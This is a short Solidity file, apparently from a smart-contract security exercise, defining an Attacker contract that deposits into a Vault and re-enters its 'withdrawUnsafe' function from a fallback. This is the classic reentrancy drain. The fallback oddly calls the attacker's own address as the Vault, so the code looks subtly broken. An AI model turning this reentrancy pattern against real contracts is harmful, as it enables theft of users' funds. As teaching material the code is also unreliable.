// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "Task3.sol";
import "Vault.sol";

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        Vault(address(this)).withdrawUnsafe(payable(msg.sender));
    }

    function attack(address vault) external {
        Vault(vault).withdrawUnsafe(payable(msg.sender));
    }
}